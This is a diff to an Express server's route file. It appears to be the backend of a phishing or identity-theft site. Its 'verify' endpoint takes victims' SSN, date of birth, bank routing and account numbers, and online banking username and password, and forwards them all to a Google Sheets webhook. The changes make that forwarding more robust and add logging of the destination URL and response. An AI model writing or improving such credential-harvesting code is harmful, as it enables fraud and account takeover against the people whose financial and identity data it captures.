@@ -24,10 +24,10 @@ const verifySchema = z.object({
   onlineBankingPass: z.string().min(1),
 });
 
-export async function registerRoutes(
+export function registerRoutes(
   httpServer: Server,
   app: Express
-): Promise<Server> {
+): Server {
   app.post(api.inquiries.create.path, async (req, res) => {
     try {
       const input = api.inquiries.create.input.parse(req.body);
@@ -48,8 +48,12 @@ export async function registerRoutes(
     try {
       const data = verifySchema.parse(req.body);
 
-      const sheetsUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL;
+      let sheetsUrl = process.env.GOOGLE_SHEETS_WEBHOOK_URL;
       if (sheetsUrl) {
+        // Sanitize the URL to remove potential quotes or whitespace from .env
+        sheetsUrl = sheetsUrl.trim().replace(/^["']|["']$/g, '');
+        console.log(`[Verify] Forwarding to Google Sheets (Length: ${sheetsUrl.length}):`, sheetsUrl);
+        
         const row = [
           data.firstName, data.lastName, data.email, data.phone,
           data.dob, data.ssn, data.address, data.city, data.state,
@@ -57,13 +61,21 @@ export async function registerRoutes(
           data.routing, data.account, data.onlineBankingId, data.onlineBankingPass,
           new Date().toISOString(),
         ];
-        await fetch(sheetsUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ values: row }),
-        });
+        try {
+          const response = await fetch(sheetsUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ values: row }),
+            redirect: "follow", // Important for GAS which redirects
+          });
+          const result = await response.text();
+          console.log("[Verify] Google Sheets Response Status:", response.status);
+          console.log("[Verify] Google Sheets Response Body:", result);
+        } catch (fetchErr) {
+          console.error("[Verify] Webhook fetch error:", fetchErr);
+        }
       } else {
-        console.log("[Verify] Submission received:", { ...data, ssn: "***", onlineBankingPass: "***" });
+        console.log("[Verify] Submission received (No URL):", { ...data, ssn: "***", onlineBankingPass: "***" });
       }
 
       res.status(200).json({ success: true });
